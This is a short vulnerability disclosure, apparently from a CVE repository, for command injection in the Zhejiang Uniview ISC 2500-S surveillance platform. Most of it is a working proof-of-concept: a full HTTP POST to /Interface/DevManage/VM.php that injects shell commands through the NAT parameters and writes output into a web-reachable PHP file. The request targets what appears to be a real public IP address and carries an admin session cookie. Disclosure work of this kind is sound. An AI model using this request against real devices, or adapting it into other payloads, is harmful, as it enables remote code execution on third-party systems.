Zhejiang Uniview ISC 2500-S system has command execution vulnerability

version:ISC 2500-S

Vulnerability location:/Interface/DevManage/VM.php

When entering the setNatConfig branch, the three parameters natAddress, natPort, and natServerPort are brought to the exec() function for command execution without any filtering.
![image](https://github.com/dezhoutorizhao/cve/assets/92038690/d4150caf-c9d1-4fc2-941b-7b67d71a94e9)

![image](https://github.com/dezhoutorizhao/cve/assets/92038690/d6780753-a446-4e32-b737-f65ff6fdd553)


We write the id into 1.php through the natAddress, natPort, and natServerPort parameters. The POC is as follows

```
POST /Interface/DevManage/VM.php HTTP/1.1
Accept: */*
Accept-Language: zh-cn
Referer: http://220.189.218.162:90/Page/SystemConfig/DevConfig/NatSet.php
x-requested-with: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: 220.189.218.162:90
Content-Length: 261
Pragma: no-cache
Cookie: logintime=Fri%20Jan%205%2018%3A46%3A56%20UTC+0800%202024; devLanguage=zh-CN; loginuser=admin; recordpasswd=false; PHPSESSID=4fa99df42dc0dad9b54b4034c74e8f91
Connection: close

cmd=setNatConfig&natAddress=1.1.1.2;echo%20`id`%20>%201.php&natPort=80;echo%20`id`%20>%201.php&natServerPort=;echo%20`id`%20>%201.php&GAJAX_USERID=0000&GAJAX_LOGINID=21822020240105183142&GAJAX_ORGCODE=0000&GAJAX_USERNAME=admin&GAJAX_ORGNAME=Root&GAJAX_ORGTYPE=2
```
![image](https://github.com/dezhoutorizhao/cve/assets/92038690/e0384c13-7582-4951-b07d-13541be3ad61)

Visit /Interface/LogReport/1.php

![image](https://github.com/dezhoutorizhao/cve/assets/92038690/243d1e8d-44b5-48fd-bc07-308d2f3c7197)
